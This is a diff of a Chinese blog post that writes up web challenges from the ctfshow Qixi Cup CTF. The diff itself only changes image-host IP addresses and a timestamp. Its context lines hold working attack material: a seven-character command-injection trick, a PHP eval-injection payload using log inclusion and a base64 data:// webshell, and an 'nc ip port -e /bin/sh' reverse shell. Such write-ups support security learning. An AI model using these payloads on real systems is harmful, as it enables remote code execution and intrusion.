@@ -23,19 +23,19 @@
 <meta property="og:site_name" content="b1ub1u的小站">
 <meta property="og:description" content="前言感觉不是特别难，但很多姿势很不戳 Webweb签到只能执行7字符以内的命令且没有回显 如果目录有写的权限时，可以利用&gt;写文件，然后将ls -t将写好的文件名再通过&gt;写入一个新的文件，执行新的文件如果目录没有写的权限，可以通过POST发包，在&#x2F;tmp目录留下临时文件，再执行. &#x2F;t*&#x2F;*，刚好达到7个字符 本题经过测试应该没有写进当前目录的权限，所以post发个反弹shel">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/11/1pmiqp_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/06/lkh7n0_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/06/lkyys8_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/06/ltivwd_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/06/lszva3_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/06/lt10yz_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/06/lt23vo_0.png">
-<meta property="og:image" content="http://81.70.101.23:11111/i/2022/08/06/lu3ihy_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/08/11/1pmiqp_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/08/06/lkh7n0_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/08/06/lkyys8_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/08/06/ltivwd_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/08/06/lszva3_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/08/06/lt10yz_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/08/06/lt23vo_0.png">
+<meta property="og:image" content="http://120.27.243.85:11111/i/2022/08/06/lu3ihy_0.png">
 <meta property="article:published_time" content="2022-08-06T04:56:15.000Z">
-<meta property="article:modified_time" content="2022-08-10T17:03:52.880Z">
+<meta property="article:modified_time" content="2023-03-02T10:23:54.868Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://81.70.101.23:11111/i/2022/08/11/1pmiqp_0.png">
+<meta name="twitter:image" content="http://120.27.243.85:11111/i/2022/08/11/1pmiqp_0.png">
   
   
   <title>ctfshow 七夕杯 - b1ub1u的小站</title>
@@ -250,10 +250,10 @@
             <h1 style="display: none">ctfshow 七夕杯</h1>
             
             <div class="markdown-body">
-              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉不是特别难，但很多姿势很不戳<br><img src="http://81.70.101.23:11111/i/2022/08/11/1pmiqp_0.png" srcset="/img/loading.gif" lazyload></p>
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉不是特别难，但很多姿势很不戳<br><img src="http://120.27.243.85:11111/i/2022/08/11/1pmiqp_0.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>只能执行7字符以内的命令且没有回显</p>
 <p>如果目录有写的权限时，可以利用<code>&gt;</code>写文件，然后将<code>ls -t</code>将写好的文件名再通过<code>&gt;</code>写入一个新的文件，执行新的文件<br>如果目录没有写的权限，可以通过POST发包，在&#x2F;tmp目录留下临时文件，再执行<code>. /t*/*</code>，刚好达到7个字符</p>
-<p>本题经过测试应该没有写进当前目录的权限，所以post发个反弹shell的包<br><img src="http://81.70.101.23:11111/i/2022/08/06/lkh7n0_0.png" srcset="/img/loading.gif" lazyload><br><img src="http://81.70.101.23:11111/i/2022/08/06/lkyys8_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>本题经过测试应该没有写进当前目录的权限，所以post发个反弹shell的包<br><img src="http://120.27.243.85:11111/i/2022/08/06/lkh7n0_0.png" srcset="/img/loading.gif" lazyload><br><img src="http://120.27.243.85:11111/i/2022/08/06/lkyys8_0.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h3><p>index.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$code</span>))&#123;<br><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$result=&#x27;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$code</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$result</span>);    <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$code</span></span>)</span>&#123;<br><br>    <span class="hljs-variable">$num1</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num1&#x27;</span>];<br>    <span class="hljs-variable">$symbol</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;symbol&#x27;</span>];<br>    <span class="hljs-variable">$num2</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num1</span>) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num2</span>) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$symbol</span>) )&#123;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/!|@|#|\\$|\%|\^|\&amp;|\(|_|=|&#123;|&#x27;|&lt;|&gt;|\?|\?|\||`|~|\[/&quot;</span>, <span class="hljs-variable">$num1</span>.<span class="hljs-variable">$num2</span>.<span class="hljs-variable">$symbol</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[\+\-\*\/]$/&quot;</span>, <span class="hljs-variable">$symbol</span>))&#123;<br>        <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$num1</span><span class="hljs-subst">$symbol</span><span class="hljs-subst">$num2</span>&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>需要传入num1、symbol、num2</p>
@@ -262,15 +262,15 @@
 <p>组合后的$result&#x3D;include “&#x2F;something”</p>
 <p>方法一：日志包含（$result&#x3D;include “&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log”）<br>payload为：</p>
 <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">num1</span><span class="hljs-operator">=</span>include <span class="hljs-string">&quot;&amp;symbol=/&amp;num2=var/log/nginx/access.log&quot;</span><br></code></pre></td></tr></table></figure>
-<p><img src="http://81.70.101.23:11111/i/2022/08/06/ltivwd_0.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://120.27.243.85:11111/i/2022/08/06/ltivwd_0.png" srcset="/img/loading.gif" lazyload></p>
 <p>方法二：包含伪协议（$result&#x3D;include “data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx”）<br>xxxx:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success! 命令执行result:\n&quot;</span>;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//base64：PD9waHAgZWNobyAic3VjY2VzcyEg5ZG95Luk5omn6KGMcmVzdWx0OlxuIjtAZXZhbCgkX0dFVFsnY21kJ10pOz8+</span><br></code></pre></td></tr></table></figure>
 
 <p>payload:</p>
 <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">num1</span><span class="hljs-operator">=</span>include <span class="hljs-string">&quot;data:/&amp;symbol=/&amp;num2=text/plain;base64,PD9waHAgZWNobyAic3VjY2VzcyEg5ZG95Luk5omn6KGMcmVzdWx0OlxuIjtAZXZhbCgkX0dFVFsnY21kJ10pOz8+&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>就可以执行任意命令了<br><img src="http://81.70.101.23:11111/i/2022/08/06/lszva3_0.png" srcset="/img/loading.gif" lazyload><br><img src="http://81.70.101.23:11111/i/2022/08/06/lt10yz_0.png" srcset="/img/loading.gif" lazyload><br><img src="http://81.70.101.23:11111/i/2022/08/06/lt23vo_0.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="easy-cmd"><a href="#easy-cmd" class="headerlink" title="easy_cmd"></a>easy_cmd</h3><p>只能使用ping、ls、nc、ifconfig四个命令，且没有回显<br>直接反弹shell<br><img src="http://81.70.101.23:11111/i/2022/08/06/lu3ihy_0.png" srcset="/img/loading.gif" lazyload></p>
+<p>就可以执行任意命令了<br><img src="http://120.27.243.85:11111/i/2022/08/06/lszva3_0.png" srcset="/img/loading.gif" lazyload><br><img src="http://120.27.243.85:11111/i/2022/08/06/lt10yz_0.png" srcset="/img/loading.gif" lazyload><br><img src="http://120.27.243.85:11111/i/2022/08/06/lt23vo_0.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="easy-cmd"><a href="#easy-cmd" class="headerlink" title="easy_cmd"></a>easy_cmd</h3><p>只能使用ping、ls、nc、ifconfig四个命令，且没有回显<br>直接反弹shell<br><img src="http://120.27.243.85:11111/i/2022/08/06/lu3ihy_0.png" srcset="/img/loading.gif" lazyload></p>
 <p>但比较奇怪，<code>nc ip port -e /bin/sh</code>可以，但是<code>nc -e /bin/sh ip port</code>却不可以</p>
 <h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>听说是0解java题，还没来得及看，等一手wp</p>
 
